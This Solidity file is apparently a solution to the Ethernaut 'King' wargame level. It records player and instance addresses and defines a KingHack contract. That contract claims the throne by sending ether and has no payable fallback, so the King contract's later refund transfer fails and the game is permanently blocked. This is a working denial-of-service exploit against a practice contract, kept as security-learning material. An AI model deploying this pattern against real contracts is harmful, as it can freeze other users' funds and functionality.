// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x8F59CFAFf86cAD85fe911D34783f9F428B5d98CB

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// define a contract without a callback 
// call the king contract claiming the throne
// because of no fallback function, the king contract will fail to reclaim the throne when trying to transfer
// it should be used the return value of the transfer function

contract KingHack {
    function claim(address king) public payable {
        (bool result, bytes memory data) = king.call{ value: msg.value }("");
        if (!result) revert();
    }
}